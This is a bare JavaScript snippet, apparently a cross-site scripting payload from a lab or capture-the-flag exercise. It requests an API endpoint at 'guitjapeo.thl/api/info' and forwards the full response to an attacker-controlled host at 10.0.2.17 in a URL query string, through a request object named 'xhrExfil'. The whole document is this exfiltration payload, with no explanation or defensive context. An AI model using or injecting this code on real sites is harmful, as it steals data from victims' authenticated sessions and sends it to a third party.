var xhr = new XMLHttpRequest();
xhr.onreadystatechange = () =>{
        if(xhr.readyState == XMLHttpRequest.DONE){
                var xhrExfil = new XMLHttpRequest();
                xhrExfil.open('GET',"http://10.0.2.17/?"+xhr.response,false);
                xhrExfil.send();
        }
};
xhr.open('GET',"https://guitjapeo.thl/api/info",false);
xhr.send();
